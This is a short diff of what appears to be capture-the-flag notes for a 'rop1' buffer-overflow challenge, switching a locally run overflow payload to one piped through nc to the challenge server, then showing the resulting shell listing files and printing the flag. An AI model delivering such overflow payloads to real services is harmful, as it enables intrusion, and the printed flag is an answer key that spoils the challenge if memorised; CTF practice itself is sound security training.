@@ -1,4 +1,11 @@
->> ./overflow.py > overflow
->> cat overflow - | dock/rop1 
+>> cat overflow - | nc p.tjctf.org 8094
 Enter your name ls
-dock  overflow  overflow.py rop1.c
+Dockerfile
+etc
+flag
+prog
+rop1
+wrapper
+cat flag
+isnt_ret_a_nice_instruction
+
